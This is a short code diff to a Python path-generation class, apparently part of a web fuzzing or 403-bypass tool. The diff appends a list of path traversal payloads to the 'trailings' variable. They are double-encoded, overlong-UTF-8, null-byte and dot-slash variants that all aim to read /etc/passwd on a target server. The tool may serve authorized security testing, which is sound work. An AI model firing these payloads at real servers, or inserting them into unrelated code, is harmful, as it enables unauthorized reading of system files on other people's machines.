@@ -96,7 +96,7 @@ class PathRepository:
     def create_new_paths(self):
         pairs = [["/", "//"], ["/.", "/./"]]
         leadings = ["/%2e"]
-        trailings = ["/", "..;/", "/..;/", "%20", "%09", "%00", ".json", ".css", ".html", "?", "??", "???", "?anyparam", "#", "#anything", "/."]
+        trailings = ["/", "..;/", "/..;/", "%20", "%09", "%00", ".json", ".css", ".html", "?", "??", "???", "?anyparam", "#", "#anything", "/.","..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252fpasswd", "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "%252e%252e%252fetc%252fpasswd", "%252e%252e%252fetc%252fpasswd%00", "a/../../../../../../../../../etc/passwd......", "a/../../../../../../../../../../../../../../../../etc/passwd/././.", "a/./......../etc/passw", "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd", "....//....//etc/passwd", "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"]
 
         paths = [self.path]
 
